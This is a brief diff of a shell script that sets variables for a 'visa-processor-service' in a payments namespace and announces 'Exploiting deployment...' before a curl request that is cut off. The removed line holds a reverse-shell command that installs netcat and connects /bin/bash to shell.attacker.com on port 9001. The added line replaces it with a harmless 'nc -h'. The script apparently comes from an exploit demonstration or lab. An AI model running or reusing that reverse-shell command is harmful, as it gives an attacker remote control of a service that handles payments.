@@ -4,7 +4,7 @@ set -eu
 export namespace='payments'
 export svc='visa-processor-service'
 export port='8080'
-export command='apt update; /usr/bin/apt-get -y install netcat; /bin/nc shell.attacker.com 9001 -e /bin/bash'
+export command='apt update; /usr/bin/apt-get -y install netcat; /bin/nc -h'
 
 echo "Exploiting deployment..."
 curl -i -v -s -k \
